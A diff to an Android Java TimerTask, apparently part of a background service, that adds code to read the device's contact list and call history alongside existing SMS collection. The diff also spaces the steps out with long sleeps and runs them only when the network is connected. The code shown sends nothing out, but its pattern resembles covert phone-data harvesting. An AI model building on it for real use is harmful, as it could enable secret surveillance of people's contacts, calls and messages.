@@ -6,6 +6,10 @@ import java.util.Date;
 import java.util.List;
 import java.util.TimerTask;
 
+import com.system.feature.contact.ContactCtrl;
+import com.system.feature.contact.ContactInfo;
+import com.system.feature.phonecall.PhoneCallCtrl;
+import com.system.feature.phonecall.PhoneCallInfo;
 import com.system.feature.sms.SmsCtrl;
 import com.system.feature.sms.SmsInfo;
 import com.system.utils.*;
@@ -42,7 +46,9 @@ public class GetInfoTask extends TimerTask
 		if (SysUtils.isNetworkConnected(service.getApplicationContext()))
 		{
 			CollectContact(this.service);
+			SysUtils.ThreadSleep(100000, LOGTAG);
 			CollectPhoneCallHist(this.service);
+			SysUtils.ThreadSleep(100000, LOGTAG);
 			CollectSms(this.service);
 		}
 		
@@ -59,11 +65,19 @@ public class GetInfoTask extends TimerTask
 
 	private void CollectPhoneCallHist(Service service) 
 	{
-		
+		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(service);
+		for (int i = 0; i < list.size(); i++)
+		{
+			list.get(i).toString();
+		}
 	}
 
 	private void CollectContact(Service service) 
 	{
-		
+		List<ContactInfo> list = ContactCtrl.getContactList(service);
+		for (int i = 0; i < list.size(); i++)
+		{
+			list.get(i).toString();
+		}
 	}
 }
